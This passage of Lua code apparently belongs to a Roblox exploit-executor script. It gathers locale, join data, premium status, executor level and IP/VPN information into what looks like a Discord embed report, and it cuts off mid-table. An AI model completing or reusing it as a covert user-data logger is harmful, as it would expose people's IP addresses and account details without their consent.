    local locale = getSystemLocale()
    local joinData = getJoinData()
    
    local embedColor = 0x9B59B6
    if playerInfo.hasPremium then
        embedColor = 0xF1C40F
    elseif executorInfo.level >= 8 then
        embedColor = 0xE74C3C
    elseif ipInfo.vpn then
        embedColor = 0xE67E22
    end
    
    local fields = {
        {
            name = "Player Information",
